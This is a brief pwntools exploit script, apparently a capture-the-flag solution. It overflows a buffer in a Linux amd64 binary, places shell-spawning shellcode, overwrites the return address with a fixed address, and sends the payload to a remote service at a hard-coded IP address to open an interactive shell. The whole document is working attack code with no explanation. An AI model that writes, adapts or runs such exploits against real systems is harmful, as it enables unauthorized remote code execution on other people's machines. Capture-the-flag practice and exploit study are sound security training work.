from pwn import*
context(arch='amd64',os='linux')
# p=process('./7')
p=remote('8.130.110.158',2107)
# gdb.attach(p)
shellcode=asm(shellcraft.sh())
payload=shellcode.ljust(0x38,b'\x00')+p64(0x40119E)+shellcode
p.sendlineafter('down',payload)
p.interactive()